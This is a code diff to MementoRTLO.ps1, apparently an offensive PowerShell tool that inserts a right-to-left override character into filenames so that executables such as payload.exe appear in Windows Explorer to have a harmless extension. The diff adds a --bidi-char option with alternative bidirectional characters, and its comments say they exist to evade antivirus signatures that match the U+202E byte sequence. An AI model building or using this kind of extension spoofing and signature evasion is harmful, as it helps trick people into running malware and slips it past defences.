@@ -33,6 +33,14 @@ Preview the output filename without creating any file.
 Print every available pattern with its global index, then exit.
 When combined with --file, only patterns for that extension are shown.
 
+.PARAMETER --bidi-char
+Bidirectional control character to use for the override.
+  rlo  U+202E  RIGHT-TO-LEFT OVERRIDE   (default; only char that produces visual spoof in Explorer)
+  rli  U+2067  RIGHT-TO-LEFT ISOLATE    (Unicode 6.3; different byte signature; no visual reversal)
+  rle  U+202B  RIGHT-TO-LEFT EMBEDDING  (legacy; different byte signature; no visual reversal)
+Note: only rlo (U+202E) produces the extension masking visible in Explorer. rli and rle are
+useful for research/AV signature comparison but do not achieve the same social-engineering effect.
+
 .PARAMETER --help / /help / -help
 Display usage information and exit.
 
@@ -54,7 +62,7 @@ Interactive selection, renames in place.
 
 .NOTES
 Author  : Franck FERMAN
-Version : 2.1.0
+Version : 2.2.0
 License : GNU AGPLv3
 GitHub  : https://github.com/franckferman/Memento-RTLO
 
@@ -65,9 +73,16 @@ Set-StrictMode -Version Latest
 $ErrorActionPreference = 'Stop'
 
 # ---------------------------------------------------------------------------
-# U+202E — Right-to-Left Override
+# Bidirectional character map — resolved after arg parsing via --bidi-char.
+# Default: U+202E (RLO). Alternatives provide different byte signatures to
+# evade AV signatures that target the U+202E byte sequence (e.g. Artoelo.B).
 # ---------------------------------------------------------------------------
-$RTLO = [char]0x202E
+$BidiCharMap = @{
+    'rlo' = [char]0x202E   # RIGHT-TO-LEFT OVERRIDE   — UTF-16LE: 2E 20
+    'rli' = [char]0x2067   # RIGHT-TO-LEFT ISOLATE    — UTF-16LE: 67 20 (Unicode 6.3)
+    'rle' = [char]0x202B   # RIGHT-TO-LEFT EMBEDDING  — UTF-16LE: 2B 20
+}
+$RTLO = $BidiCharMap['rlo']  # placeholder — overwritten after arg parsing
 
 # ---------------------------------------------------------------------------
 # Association table.
@@ -179,6 +194,10 @@ function Show-Help {
     Write-Host "  --replace              Rename in-place (default: create a copy)"
     Write-Host "  --dry-run              Preview output filename, no file written"
     Write-Host "  --show-list            List all available patterns with global indices"
+    Write-Host "  --bidi-char <mode>     Bidi override character: rlo (default) | rli | rle"
+    Write-Host "                           rlo = U+202E RLO — visual spoof works in Explorer (Artoelo.B)"
+    Write-Host "                           rli = U+2067 RLI — different byte signature; no visual spoof"
+    Write-Host "                           rle = U+202B RLE — different byte signature; no visual spoof"
     Write-Host "  --help / /help         Show this help"
     Write-Host ""
     Write-Host "Examples:" -ForegroundColor Yellow
@@ -186,6 +205,7 @@ function Show-Help {
     Write-Host "  .\MementoRTLO.ps1 --file payload.exe --choice 3"
     Write-Host "  .\MementoRTLO.ps1 --file payload.exe --choice 3 --dry-run"
     Write-Host "  .\MementoRTLO.ps1 --file payload.bat --replace"
+    Write-Host "  .\MementoRTLO.ps1 --file payload.exe --choice 1 --bidi-char rli"
     Write-Host ""
     exit 0
 }
@@ -213,11 +233,12 @@ function Show-List([string]$filterExt = '') {
 # Argument parsing
 # ---------------------------------------------------------------------------
 $Params = [ordered]@{
-    File    = $null
-    Choice  = $null      # $null = not provided; 0 is invalid, caught later
-    Replace = $false
-    DryRun  = $false
+    File     = $null
+    Choice   = $null      # $null = not provided; 0 is invalid, caught later
+    Replace  = $false
+    DryRun   = $false
     ShowList = $false
+    BidiChar = 'rlo'      # rlo (default) | rli | rle
 }
 
 $i = 0
@@ -229,12 +250,26 @@ while ($i -lt $args.Count) {
         '^--replace$'   { $Params.Replace = $true }
         '^--dry-run$'   { $Params.DryRun = $true }
         '^--show-list$' { $Params.ShowList = $true }
+        '^--bidi-char$' {
+            $i++
+            $bc = $args[$i].ToLower()
+            if ($bc -notin @('rlo','rli','rle')) {
+                Write-Host "Error: --bidi-char must be rlo, rli, or rle." -ForegroundColor Red
+                exit 1
+            }
+            $Params.BidiChar = $bc
+        }
         default {
             Write-Host "Unknown argument: $($args[$i])" -ForegroundColor Yellow
         }
     }
     $i++
 }
+
+# ---------------------------------------------------------------------------
+# Resolve the bidi character from --bidi-char (default: rlo = U+202E)
+# ---------------------------------------------------------------------------
+$RTLO = $BidiCharMap[$Params.BidiChar]
 
 # ---------------------------------------------------------------------------
 # Handle --show-list (with optional --file filter)
@@ -325,11 +360,13 @@ $NewFileName = Build-Filename $Selected $FileExt
 $SourceDir   = (Get-Item $Params.File).DirectoryName
 $NewPath     = [System.IO.Path]::Combine($SourceDir, $NewFileName)
 
+$BidiLabel = @{ 'rlo' = 'U+202E RLO'; 'rli' = 'U+2067 RLI'; 'rle' = 'U+202B RLE' }[$Params.BidiChar]
 Show-Banner
 Write-Host ""
-Write-Host "  Source  : $($Params.File)" -ForegroundColor White
-Write-Host "  Pattern : [$($Selected.GlobalIndex)] $($Selected.Name).$($Selected.FakeExt)  (for $FileExt)" -ForegroundColor White
-Write-Host "  Output  : $NewFileName" -ForegroundColor Green
+Write-Host "  Source    : $($Params.File)" -ForegroundColor White
+Write-Host "  Pattern   : [$($Selected.GlobalIndex)] $($Selected.Name).$($Selected.FakeExt)  (for $FileExt)" -ForegroundColor White
+Write-Host "  Bidi char : $BidiLabel" -ForegroundColor White
+Write-Host "  Output    : $NewFileName" -ForegroundColor Green
 Write-Host ""
 
 # ---------------------------------------------------------------------------
